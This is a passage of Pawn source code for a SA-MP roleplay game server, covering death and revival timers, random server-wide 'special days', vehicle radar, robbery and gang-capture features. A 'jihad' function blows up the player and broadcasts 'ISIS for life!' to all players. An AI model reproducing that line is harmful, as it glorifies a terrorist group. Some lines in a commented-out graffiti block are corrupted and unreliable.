	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 41 || weaponid == 42 || weaponid == 43)
	{ // Slot 9
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][9] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 10 || weaponid == 11 || weaponid == 12 || weaponid == 13 || weaponid == 14 || weaponid == 15)
	{ // Slot 10
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][10] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 44 || weaponid == 45 || weaponid == 46)
	{ // Slot 11
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][11] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 40)
	{ // Slot 12
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][12] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
}
public AfterLife(playerid)
{
	IsAfterLifing[playerid] = 1;
	SecsToGo[playerid]--;
    new string[128];
	format(string,sizeof(string),"~b~ ~h~ ~h~you are in afterlife~n~ ~b~ ~h~ ~h~you will revive in %d seconds",SecsToGo[playerid]);
	GameTextForPlayer(playerid,string,1100,3);
	if (SecsToGo[playerid] <= 0)
    {
    	KillTimer(AfterLifeTimer);
        SendClientMessage(playerid,COLOR_MEDIC,"------------------ Health Advise -----------------");
	    SendClientMessage(playerid,COLOR_WHITE,"You have revived after a long rest.");
	    SendClientMessage(playerid,COLOR_WHITE,"The medics have threated you and now you are healthy.");
	    SendClientMessage(playerid,COLOR_WHITE,"Remember, you have lost memory of recent 30 minutes.");
	    SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
	    SpawnPlayer(playerid);
	    return 1;
	}
	return 1;
}

public AutoDeath(playerid)
{
	if (Player[playerid][pDead] == 0) return 0;
	else if (Player[playerid][pDead] == 1)
	{
	    new saystring[128], deathstring[128];
		switch (random(2))
		{
	    	case 0:
			{
				format(saystring,sizeof(saystring),"%s mumbles: I can't hold more..", GetName(playerid));
				format(deathstring,sizeof(deathstring),"* %s closes his eyes, falling into death.", GetName(playerid));
			}
			case 1:
			{
			    format(saystring,sizeof(saystring),"%s mumbles: Aghh.. It's cold.. I feel something.. A light-..",GetName(playerid));
			    format(deathstring,sizeof(deathstring),"* %s is now inmobilized, and dead.",GetName(playerid));
			}
		}
		SendNearbyMessage(playerid, 1.5, saystring, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		SendNearbyMessage(playerid, 15, deathstring, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);

		Player[playerid][pDead] = 0;
	    SendClientMessage(playerid,COLOR_MEDIC,"------------------ Health Advise -----------------");
	    SendClientMessage(playerid,COLOR_WHITE,"You are now in the afterlife. You may rest in peace.");
	    SendClientMessage(playerid,COLOR_WHITE,"When you revive, you will lost your IC memory of last 30 minutes.");
	    SendClientMessage(playerid,COLOR_WHITE,"If you were non-RPly killed, report the player at the forums.");
	    SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
	    Player[playerid][pHospital] = 1;
        SpawnPlayer(playerid);
	    return 1;
	}
	return 1;
}

forward DayOver();
public DayOver()
{
	new day[256];
	DayRespect = 0;
	DayPaycheck = 0;
	DayNoShops = 0;
	DayZeroGravity = 0;
	SendRconCommand("hostname International Roleplay");
	format(day, sizeof(day), "%s", SpecialDay());
	TextDrawSetString(SPDNDDraw, day);
	return 1;
}
stock SPDN()
{
	new dayz[32];
	if(DayPaycheck == 1)
	{
 		format(dayz, sizeof(dayz), "Day Of World Wide Economics");
	}
	if(DayNoShops == 1)
	{
		format(dayz, sizeof(dayz), "Sunday");
	}
	if(DayRespect == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Liberty");
	}
	if(DayZeroGravity == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Restricted Air Space");
	}
	if(DayUnbreakable == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Unstoppable");
	}
	return dayz;
}
stock SpecialDay()
{
	new dayz[256];
	if(DayPaycheck == 1)
	{
 		format(dayz, sizeof(dayz), "Day Of World Wide Economics~n~Today the Los Santos Government won a community~n~project,therefore everyones salary is bigger.~n~((Today you get 25 percent bigger paychecks.))");
	}
	else if(DayNoShops == 1)
	{
		format(dayz, sizeof(dayz), "Sunday~n~~w~It's Sunday-all shops are closed!~n~  ((Today you can't enter any shops/businesses.))");
	}
	else if(DayRespect == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Liberty~n~Today we celebrate the Day Of Liberty,therefore~n~respect is easily earned on the streets of LS.~n~((Today you get double respect.))");
	}
	else if(DayZeroGravity == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Restricted Air Space~n~Today all travelling agency are closed.~n~((You can't fly any plane.))");
	}
	else if(DayUnbreakable == 1)
	{
        format(dayz, sizeof(dayz), "Day Of Unstoppable~n~The atmosphere is different today, ~n~it makes you feel stronger.~n~((Max health and armor is 150.))");
	}
	else
	{
	    format(dayz, sizeof(dayz), "Today is just an ordinary day.");
	}
	return dayz;
}
stock IsSeatAvailable(vehicleid, seat)
{
	new carmodel = GetVehicleModel(vehicleid);
	for (new i = 0; i < sizeof( OneSeatVehicles ); i++ )
	{
	    if( carmodel == OneSeatVehicles[i] ) return 0;
	}
	foreach(Player, i)
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == seat) return 0;
	}
	return 1;
}
public jihad(playerid)
{
	new string[128];
	new Float:Pos[3];
    GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    CreateExplosion(Pos[0], Pos[1], Pos[2], 6, 10);
    SetPlayerHealth(playerid, 0);
    SetPlayerArmour(playerid, 0);
    format(string, sizeof(string), "%s: ISIS for life!", GetName(playerid));
   	SendClientMessageToAll(COLOR_LIGHTRED, string);
   	jihad1timer = SetTimerEx("jihad1",3000,true,"i",playerid);
   	KillTimer(jihadtimer);
	return 1;
}
public jihad1(playerid)
{
    Player[playerid][pDead] = 0;
    Player[playerid][pHospital] = 1;
    SpawnPlayer(playerid);
   	KillTimer(jihad1timer);
	return 1;
}
forward Paintballtime();
public Paintballtime()
{
   new string[128];
   PaintballOn = 0;
   foreach(Player, i)
   {
      if(Paintball[i])
      {
       	format(string, sizeof(string), "** Paintball game has been finished. **");
        if(Paintball[i]) SendClientMessage(i, COLOR_LIGHTRED, string);
        Paintball[i] = 0;
   	    paintballdeath[i] = 0;
   	    SetPlayerPos(i, 1310.1110,-1368.5656,13.517786);
    	SetPlayerInterior(i, 0);
    	SetPlayerVirtualWorld(i, 0);
     	SetPlayerHealth(i, Player[i][pHealth]);
     	SetPlayerArmour(i, Player[i][pArmor]);
    	GunsBeingRemoved[i] = 1;
     	ResetPlayerWeapons(i);
    	GunsBeingRemoved[i] = 1;
    	for(new w = 0; w < 13; w++)
    	{
    	    GiveZamoraWeapon(i, Player[i][pWeapon][w], Player[i][pWeaponAmmo][w]);
    	}
      }
   }
   return 1;
}
ReturnUser(text[]) {

	new
		strPos,
		returnID = 0,
		bool: isnum = true;

	while(text[strPos]) {
		if(isnum) {
			if('0' <= text[strPos] <= '9') returnID = (returnID * 10) + (text[strPos] - '0');
			else isnum = false;
		}
		strPos++;
	}
	if(isnum) {
		if(Logged(returnID)) return returnID;
	}
	else {

		new
			sz_playerName[MAX_PLAYER_NAME];

		foreach(Player, i) {
			GetPlayerName(i, sz_playerName, MAX_PLAYER_NAME);
			if(!strcmp(sz_playerName, text, true, strPos)) return i;
		}
	}
	return INVALID_PLAYER_ID;
}
stock IsMDCPermitted(playerid)
{
	if(	Player[playerid][pFac] == 1|| Player[playerid][pFac] == 6)
	{
		return 1;
	}
	return 0;
}
stock IsPlayerInZone(playerid, zoneid)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	return (x > ZoneInfo[zoneid][zMinX] && x < ZoneInfo[zoneid][zMaxX] && y > ZoneInfo[zoneid][zMinY] && y < ZoneInfo[zoneid][zMaxY]);
}

stock GetPlayersInZone(zoneid, teamid)
{
	new count;
	for(new i=0; i < MAX_PLAYERS; i++)
	{
	    if(Logged(i) && Player[i][pFam] == teamid && IsPlayerInZone(i, zoneid))
	    {
			count++;
	    }
	}
	return count;
}

stock GetPlayerZone(playerid)
{
	for(new i=0; i < sizeof(ZoneInfo); i++)
	{
		if(IsPlayerInZone(playerid, i))
		{
			return i;
		}
	}
	return -1;
}
/*public ResetVariables(playerid)
{
    DeletePVar(playerid, "SettingGraffiti");
	KeyPressed[playerid] = 0;
	KeyForPress[playerid] = 0;
	ColorNow[playerid] = 0;
	CountTimer[playerid] = 0;
	return 1;
}

stock PreloadAnimLibb(playerid, animlib[])
{
   ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
   return 1;
}*/
public OnPlayerModelSelection(playerid, response, listid, modelid)
{
    new idx = GetPlayerVirtualWorld(playerid)-100, string[128];
	if(listid == skinlist)
	{
	    if(response)
	    {
		    Player[playerid][pModel] = modelid;
        	SetPlayerSkin(playerid, modelid);
         	BizInfo[idx][bMoney] += 1500;
          	BizInfo[idx][bProducts] --;
          	GiveZamoraMoney(playerid, -1500);
          	format(string, sizeof(string), "* %s has bought new clothes for $1500.", GetName(playerid));
           	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    }
	    else SendClientMessage(playerid, COLOR_GRAD2, "You've closed the new clothes sets.");
    	return 1;
	}
	if(listid == toys)
	{
	    if(response)
	    {
          	format(string, sizeof(string), "* This toy's id is %d.", modelid);
           	SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	    else SendClientMessage(playerid, COLOR_GRAD2, "You've closed the toys list.");
    	return 1;
	}
	return 1;
}
forward VoteTimer();
public VoteTimer()
{
	new string[128];
	format(string, sizeof(string), "** The Vote has ended with %d YES votes and %d NO votes.", VoteYES, VoteNO);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	VoteStarted = 0;
	VoteYES = 0;
	VoteNO = 0;
    foreach(Player, i)
	{
		HasVoted[i] = 0;
	}
	return 1;
}
/*public DeleteObject(playerid)
{
	DestroyDynamicObject(ShowFont[playerid]);
	ShowPlayerDialog(playerid,5,DIALOG_STYLE_LIST,"{DAA520}Select the font for graffiti","{ffffff}Font 1 {4682B4}[Urban Riot]\n{ffffff}Font 2 {4682B4}[Bombing]\n{ffffff}Font 3 {4682B4}[Impact]\n{ffffff}Font 4 {4682B4}[Los Santos]\n{ffffff}Font 5 {4682B4}[Gangland Style]","Ok","Go back");
	return 1;
}

public CreateGraffiti(playerid)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x,y,z);
	new string[128];
	format(string, 128, "{%s}%s", GraffitiColor[playerid], GraffitiText[playerid]);
	GraffitiObject[playerid] = CreateDynamicObject(19482, x+0.5, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid),
	(playerid), playerid, 200);
	SetDynamicObjectMaterialText(GraffitiObject[playerid], 0, string, OBJECT_MATERIAL_SIZE_256x256, GraffitiFont[playerid], GraffitiSize[playerid], 0, 0xFFFFFFFF, 0, 1);
	EditDynamicObject(playerid, GraffitiObject[playerid]);
	SendClientMessage(playerid,-1,"Use the Object Editor for placing text on the wall.");
	SendClientMessage(playerid,-1,"At the moment the text is visible only to you.");
	return 1;
}
public StartDrawing(playerid)
{
    PlayerTextDrawShow(playerid, ClickTD[playerid]);
    SendClientMessage(playerid,0xFFFFFFFF,"Every 3 seconds, you will be shown a button that you must push to keep up.");
    UpdateTimer[playerid] = SetTimerEx("UpdateKey",2000,true,"i",playerid);
    ColorNow[playerid] = 1;
    CountTimer[playerid] = 0;
    ApplyAnimation(playerid, "SPRAYCAN", "spraycan_full", 4.0, 1, 1, 1, 0, 0, 1);
	return 1;
}

public UpdateKey(playerid)
{
    CountTimer[playerid] += 1;
	if(CountTimer[playerid] == 10) return GraffitiDone(playerid);
	if(KeyPressed[playerid] == 0 && KeyForPress[playerid] != 0) return GraffitiFailed(playerid);
	KeyPressed[playerid] = 0;
	new txt[2];
	new changecolor[4];
	new string[64];
	switch(random(3))
	{
	    case 0: KeyForPress[playerid] = 1, txt = "Y";
	    f KeyForPress[playerid] = 2, txt = "H";
	    case 2: KeyForPress[playerid] = 3, txt = "N";
	}
	if(ColorNow[playerid] == 1) { ColorNow[playerid] = 2; } else if(ColorNow[playerid] == 2) { ColorNow[playerid] = 1; }
	switch(ColorNow[playerid])
	{
	    f changecolor = "~r~";
	    case 2: changecolor = "~g~";
	}
	PlayerTextDrawShow(playerid, ClickTD[playerid]);
	PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
	format(string, 64, "PRESS: %s%s", changecolor, txt);
	PlayerTextDrawSetString(playerid,ClickTD[playerid],string);
	return 1;
}

public GraffitiDone(playerid)
{
    new string[128];
    KillTimer(UpdateTimer[playerid]);
    DestroyDynamicObject(GraffitiObject[playerid]);
	format(string, 128, "{%s}%s", GraffitiColor[playerid], GraffitiText[playerid]);
	CreateDynamicObject(19482, GraffitiPos[playerid][0], GraffitiPos[playerid][1], GraffitiPos[playerid][2], GraffitiPos[playerid][3], GraffitiPos[playerid][4], GraffitiPos[playerid][5], GetPlayerVirtualWorld(playerid), f(playerid), -1, 200);
	SetDynamicObjectMaterialText(GraffitiObject[playerid], 0, string, OBJECT_MATERIAL_SIZE_256x256, GraffitiFont[playerid], GraffitiSize[playerid], 0, 0xFFFFFFFF, 0, 1);
	ResetVariables(playerid);
	SendClientMessage(playerid,0xFFFFFFFF,"You have successfully painted garaffiti.");
	PlayerTextDrawSetString(playerid,ClickTD[playerid],"READY!!!");
	PlayerTextDrawHide(playerid, ClickTD[playerid]);
	ClearAnimations(playerid);
	return 1;
}

public GraffitiFailed(playerid)
{
    KillTimer(UpdateTimer[playerid]);
    DestroyDynamicObject(GraffitiObject[playerid]);
	ResetVariables(playerid);
	SendClientMessage(playerid,0xFF6800FF,"You failed the task and could not draw graffiti.");
	PlayerTextDrawSetString(playerid,ClickTD[playerid],"READY!!!");
	PlayerTextDrawHide(playerid, ClickTD[playerid]);
	ClearAnimations(playerid);
	return 1;
}*/
ProxDetectorS(Float:radi, playerid, targetid) {
	new
		Float: fp_playerPos[3];

	GetPlayerPos(targetid, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]);

	if(IsPlayerInRangeOfPoint(playerid, radi, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
	{
		return 1;
	}
	return 0;
}
stock PlayerFacePlayer(playerid, targetplayerid)
{
	new Float: Angle;
	GetPlayerFacingAngle(playerid, Angle);
	SetPlayerFacingAngle(targetplayerid, Angle+180);
	return true;
}
stock CreateCone(Float:x,Float:y,Float:z,Float:Angle)
{
    for(new i = 0; i < sizeof(ConeInfo); i++)
  	{
  	    if(ConeInfo[i][cCreated] == 0)
  	    {
            ConeInfo[i][cCreated]=1;
            ConeInfo[i][cX]=x;
            ConeInfo[i][cY]=y;
            ConeInfo[i][cZ]=z-1;
            ConeInfo[i][cObject] = CreateDynamicObject(1238, x, y, z-0.7, 0, 0, Angle);
	        return 1;
  	    }
  	}
  	return 0;
}

stock DeleteAllCone()
{
    for(new i = 0; i < sizeof(ConeInfo); i++)
  	{
  	    if(ConeInfo[i][cCreated] == 1)
  	    {
  	        ConeInfo[i][cCreated]=0;
            ConeInfo[i][cX]=0.0;
            ConeInfo[i][cY]=0.0;
            ConeInfo[i][cZ]=0.0;
            DestroyDynamicObject(ConeInfo[i][cObject]);
  	    }
	}
    return 0;
}
stock DeleteClosestCone(playerid)
{
    for(new i = 0; i < sizeof(ConeInfo); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 4.0, ConeInfo[i][cX], ConeInfo[i][cY], ConeInfo[i][cZ]))
        {
  	        if(ConeInfo[i][cCreated] == 1)
            {
                ConeInfo[i][cCreated]=0;
                ConeInfo[i][cX]=0.0;
                ConeInfo[i][cY]=0.0;
                ConeInfo[i][cZ]=0.0;
                DestroyDynamicObject(ConeInfo[i][cObject]);
                return 1;
  	        }
  	    }
  	}
    return 0;
}
forward RandomGoodDay();
public RandomGoodDay()
{
    if(DayRespect == 1 || DayNoShops == 1 || DayZeroGravity == 1 || DayPaycheck == 1 || DayUnbreakable == 1) return 0;
    new rr = random(2);
    new days[256];
    if(rr == 1)
    {
            DayPaycheck = 1;
	        SetTimer("DayOver", 7200000, false);
	        SendRconCommand("hostname International Roleplay [Day Of World Wide Economics]");
	        format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else if(rr == 2)
    {
            DayRespect = 1;
          	SetTimer("DayOver", 7200000, false);
            SendRconCommand("hostname International Roleplay [Day Of Liberty]");
            format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else if(rr == 3)
    {
            DayUnbreakable = 1;
          	SetTimer("DayOver", 7200000, false);
            SendRconCommand("hostname International Roleplay [Day Of Unstoppable]");
            format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    return 1;
}
forward RandomDay();
public RandomDay()
{
    new string[256], days[256];
    if(DayRespect == 1 || DayNoShops == 1 || DayZeroGravity == 1 || DayPaycheck == 1 || DayUnbreakable == 1) return 0;
    new rr = random(4);
    if(rr == 1)
    {
            DayPaycheck = 1;
 			format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
	        SetTimer("DayOver", 7200000, false);
	        SendRconCommand("hostname International Roleplay [Day Of World Wide Economics]");
	        format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else if(rr == 2)
    {
            DayRespect = 1;
            format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
            SendClientMessageToAll(COLOR_VIP, string);
          	SetTimer("DayOver", 7200000, false);
            SendRconCommand("hostname International Roleplay [Day Of Liberty]");
            format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else if(rr == 3)
    {
            DayNoShops = 1;
            format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
            SendClientMessageToAll(COLOR_VIP, string);
            SetTimer("DayOver", 3600000, false);
            SendRconCommand("hostname International Roleplay [Sunday]");
            format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else if(rr == 4)
    {
            DayUnbreakable = 1;
          	SetTimer("DayOver", 7200000, false);
            SendRconCommand("hostname International Roleplay [Day Of Unstoppable]");
            format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
    }
    else
    {
            DayZeroGravity = 1;
            format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
            SendClientMessageToAll(COLOR_VIP, string);
            SetTimer("DayOver", 3600000, false);
           	SendRconCommand("hostname International Roleplay [Day Of Restricted Air Space]");
           	format(days, sizeof(days), "%s", SpecialDay());
            TextDrawSetString(SPDNDDraw, days);
	}
    return 1;
}
stock IsVehicleOccupied(vehicleid)
{
    foreach(Player,i)
	{
		if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == 0)
			return 1;
    }
	return INVALID_VEHICLE_ID;
}

stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{
    new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
    GetPlayerCameraPos(playerid, cx, cy, cz);
    GetPlayerCameraFrontVector(playerid, fx, fy, fz);
    return (radius >= DistanceCameraTargetToLocation(cx, cy, cz, x, y, z, fx, fy, fz));
}
forward Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,  Float:ObjX, Float:ObjY, Float:ObjZ,  Float:FrX, Float:FrY, Float:FrZ);
Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,  Float:ObjX, Float:ObjY, Float:ObjZ,  Float:FrX, Float:FrY, Float:FrZ)
{

    new Float:TGTDistance;

    // get distance from camera to target
    TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));

    new Float:tmpX, Float:tmpY, Float:tmpZ;

    tmpX = FrX * TGTDistance + CamX;
    tmpY = FrY * TGTDistance + CamY;
    tmpZ = FrZ * TGTDistance + CamZ;

    return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}
GetVehicleInfrontID (vehid)
{
    new Float: temp = 7.0;
        new j = 0;
        for (new i = 1; i <= MAX_VEHICLES; i++)
        {
            new Float: a, Float: x1, Float: y1, Float: z1, Float: x2, Float: y2, Float: z2;
        GetVehiclePos (vehid, x1, y1, z1);
        GetVehicleZAngle (vehid, a);
                if (i != vehid)
                {
                        if (GetVehiclePos (i, x2, y2, z2))
                        {
                                new Float: distance = floatsqroot (floatpower ((x1 - x2), 2) + floatpower ((y1 - y2), 2) + floatpower ((z1 - z2), 2));
                                GetVehicleZAngle (vehid, a);

                                if (distance < 300.0)
                                {
                                x1 = x1 + (distance * floatsin(-a, degrees));
                                        y1 = y1 + (distance * floatcos(-a, degrees));

                                        distance = floatsqroot ((floatpower ((x1 - x2), 2)) + (floatpower ((y1 - y2), 2)));

                                        if (temp > distance)
                                        {
                                                temp = distance;
                                                j = i;
                                        }
                                }
                        }
                }
        }
        if (temp < 7.0) return j;
        return -1;
}

public UpdateSpeed (vehid)
{
    new id = GetVehicleInfrontID (vehid);
        if (id < 0)
        {
                TextDrawSetString (SpeedAndModel [vehid], "~b~N/A ~n~~r~N/A");
        }
        else
        {
                new str[32], Float: velocityX, Float: velocityY, Float: velocityZ;
                GetVehicleVelocity (id, velocityX, velocityY, velocityZ);
        new speed = floatround (floatsqroot (floatpower (velocityX, 2) + floatpower (velocityY, 2) + floatpower (velocityZ, 2)) * 136.666667, floatround_round);
                format (str, sizeof (str), "~b~%s ~n~~r~%d", VehicleModel [GetVehicleModel (id) - 400], speed);
                TextDrawSetString (SpeedAndModel [vehid], str);
        }

        for (new i = 0; i < MAX_PLAYERS; i++)
        {
                if (IsPlayerInVehicle (i, vehid))
            {
                    TextDrawShowForPlayer (i, SpeedAndModel [vehid]);
                }
        }
        return 1;
}

public CheckValidTextDraws()
{
        for (new i = 0; i < MAX_PLAYERS; i++)
        {
            if (Logged (i))
            {
                        if (IsPlayerInAnyVehicle (i))
                        {
                            new vehid = GetPlayerVehicleID (i);
                            if (VehRadarID [vehid] > -1)
                            {
                                TextDrawShowForPlayer (i, RadarHud);
                                if (CheckingSpeed [vehid] > 0)
                                {
                                    TextDrawShowForPlayer (i, SpeedAndModel [vehid]);
                                }
                                else
                                {
                                    TextDrawHideForPlayer (i, SpeedAndModel [vehid]);
                                }
                            }
                            else
                            {
                                TextDrawHideForPlayer (i, RadarHud);
                            }
                        }

                        else
                        {
                            TextDrawHideForPlayer (i, RadarHud);
                            TextDrawHideForPlayer (i, SpeedAndModel [OldVehID[i]]);
                            OldVehID [i] = 0;
                        }
            }
        }
        return 1;
}
public THERMALON( playerid, veh )
{
	TextDrawDestroy( crosshair[playerid] );
 	crosshair[playerid] = TextDrawCreate( 306.0, 218.0, "+" );
  	TextDrawLetterSize( crosshair[playerid], 1.4 ,1.4 );
   	TextDrawShowForPlayer( playerid, crosshair[playerid] );
                objectids[veh] = CreateObject( 3785,0,0,0,0,0,0,80 );
                AttachObjectToVehicle( objectids[veh], veh, 0.000000, 2.599999, -0.800000, 0.000000, 0.000000, 0.000000 );
                AttachCameraToObject( playerid, objectids[veh] );
                SetPVarInt( playerid, "ThermalActive", 1 );
                SendClientMessage( playerid,COLOR_LIGHTRED,"NOTICE: You are now in Camera mode. To leave camera mode type /camera");
                SendClientMessage( playerid,COLOR_LIGHTRED,"WARNINGGG: You are still able to exit vehicle.");
                playerveh[playerid] = veh;
                return 1;
}



public THERMALOFF(playerid)
{
                TextDrawDestroy( crosshair[playerid] );
                new vehid = playerveh[playerid];
                SendClientMessage( playerid,COLOR_LIGHTRED,"NOTICE: You have left camera mode." );
                DeletePVar( playerid,"ThermalActive" );
                SetCameraBehindPlayer( playerid );
                DestroyObject(objectids[vehid]);
                return 1;
}
forward GarageTimer(playerid);
public GarageTimer(playerid)
{
	if(Logged(playerid))
	{
		GarageTime[playerid]--;
		if(GarageTime[playerid] > 0)
		{
		    SetTimerEx("GarageTimer", 1000, false, "i", playerid);
		}
	}
	return 1;
}
forward BankVaultTimer();
public BankVaultTimer()
{
	CreateExplosion(2237.7341,2095.7544,100.3772, 11, 5);
	SendRobberyMessage(COLOR_YELLOW, "** You can start loading money in your bags, money will be loaded in 5 minutes **");
	SendRobberyMessage(COLOR_YELLOW, "** Do not exit the bank or you will fail the robbery **");
	SendRobberyMessage(COLOR_YELLOW, "** You will be informed when the money is fully loaded and ready to be delivered **");
	SetTimer("BankVaultLoaded", 300000, false);
	return 1;
}

forward BankVaultLoaded();
public BankVaultLoaded()
{
    SendRobberyMessage(COLOR_LIGHTRED, "** The money is loaded successfully, go and deliver it to the checkpoint **");
	foreach(Player, playerid)
	{
	    if(BankRobber[playerid])
	    {
	        DeliverMoney[playerid] = 1;
	        SetPlayerCheckpoint(playerid, -1478.9646,2631.4436,58.7813, 10);
	    }
	}
	return 1;
}
forward CapturePoint(playerid, idx);
public CapturePoint(playerid, idx)
{
	new Float:Cap[3], string[256];
	new idxx = Player[playerid][pFam];
	GetPlayerPos(playerid, Cap[0], Cap[1], Cap[2]);
	if(Cap[0] == Capture[0] && Cap[1] == Capture[1] && Cap[2] == Capture[2])
	{
	    if(FamInfo[idxx][fColor] == 2)
        {
     		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {0000FF}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
   	    }
   	    else if(FamInfo[idxx][fColor] == 1)
       	{
	   		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {00FFFF}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
        }
   		else if(FamInfo[idxx][fColor] == 3)
    	{
    		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {FF0000}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
     	}
     	else if(FamInfo[idxx][fColor] == 4)
     	{
    		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {B40404}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
     	}
     	else if(FamInfo[idxx][fColor] == 5)
     	{
	  		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {FFFF00}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    	else if(FamInfo[idxx][fColor] == 6)
	    {
	  		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {DF7401}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
	    }
    	else if(FamInfo[idxx][fColor] == 7)
    	{
	   		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {088A08}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
     	}
     	else if(FamInfo[idxx][fColor] == 8)
     	{
	  		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {CC2EFA}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    	else if(FamInfo[idxx][fColor] == 9)
    	{
    		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {00FF00}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
       	}
       	else if(FamInfo[idxx][fColor] == 10)
       	{
	  		format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {A4A4A4}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    	else if(FamInfo[idxx][fColor] == 11)
	    {
   	    	format(string, sizeof(string), "%s has attempted to capture the {01A9DB}%s {FF6347}for {000000}%s{FF6347}, it will be theirs in 10 minutes.", GetName(playerid), PointInfo[idx][pName], FamInfo[idxx][fName]);
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
    	}
    	else
	    {
